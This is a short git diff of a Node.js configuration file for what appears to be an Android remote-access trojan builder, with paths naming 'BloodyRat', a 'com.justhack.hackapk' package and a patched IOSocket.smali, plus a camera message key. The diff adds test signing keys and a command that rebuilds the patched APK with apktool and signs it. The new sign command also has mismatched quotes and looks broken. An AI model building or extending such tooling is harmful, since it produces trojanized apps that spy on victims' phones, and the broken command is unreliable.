@@ -12,13 +12,18 @@ exports.apkSignedBuildPath = path.join(__dirname, '../assets/webpublic/BloodyRat
 exports.downloadsFolder = '/client_downloads'
 exports.downloadsFullPath = path.join(__dirname, '../assets/webpublic', exports.downloadsFolder)
 
+exports.testkey509 = path.join(__dirname, '../app/factory/', 'testkey.x509.pem');
+exports.testkeypk8 = path.join(__dirname, '../app/factory/', 'testkey.pk8');
+
 exports.apkTool = path.join(__dirname, '../app/factory/', 'apktool.jar');
-exports.apkSign = path.join(__dirname, '../app/factory/', 'sign.jar');
+exports.apkSign = path.join(__dirname, '../app/factory/', 'signapk.jar');
 exports.smaliPath = path.join(__dirname, '../app/factory/decompiled');
 exports.patchFilePath = path.join(exports.smaliPath, '/smali/com/justhack/hackapk/IOSocket.smali');
 
 exports.buildCommand = 'java -jar "' + exports.apkTool + '" b "' + exports.smaliPath + '" -o "' + exports.apkBuildPath + '"';
-exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+// exports.signCommand = 'java -jar "' + exports.apkSign + '" "' + exports.apkBuildPath + '"'; // <-- fix output
+exports.signCommand = 'java -jar "' + exports.apkSign + '" ' + exports.testkey509 + '" ' + exports.testkeypk8 + '" ' + exports.apkBuildPath + '" ' + '"';
+
 
 exports.messageKeys = {
     camera: '0xCA',
